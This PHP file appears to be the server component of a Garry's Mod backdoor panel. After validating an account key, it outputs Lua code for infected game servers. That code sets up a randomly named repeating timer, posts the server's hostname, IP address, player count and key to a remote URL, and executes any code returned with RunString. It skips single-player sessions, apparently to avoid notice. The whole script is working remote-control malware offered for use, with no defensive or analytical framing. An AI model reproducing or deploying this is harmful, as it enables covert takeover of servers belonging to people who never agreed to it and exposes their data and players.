<?php
include('../core/class/include.php');

// Génére une chaine de charactére

function reloadString($length = 100) {

    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';

    $charactersLength = strlen($characters);

    $randomString = '';

    for ($i = 0; $i < $length; $i++) {

        $randomString .= $characters[rand(0, $charactersLength - 1)];

    }

    return $randomString;

}

$key = htmlspecialchars($_GET['key']);
if(empty($key)){
	die("no key");
}
if(!Account::CheckKey($key)){
	die("invalid key");
}

$string = reloadString(10);

$url = "https://".$_SERVER["HTTP_HOST"].str_replace("1.php", "2.php", $_SERVER["REQUEST_URI"]);

echo '

kdo = 609

if game.SinglePlayer() then return end

timer.Create( "'.$string.'", '.Params::GetValue('timer_call').', 0, function()

local a = {

n = GetHostName(),

nb = tostring(#player.GetAll()),

i = game.GetIPAddress(),

svkey = '.$key.',

string = '.$string.'

}

http.Post( "'.$url.'", a,

function( body, len, headers, code )

RunString(body)

end)

end)

';
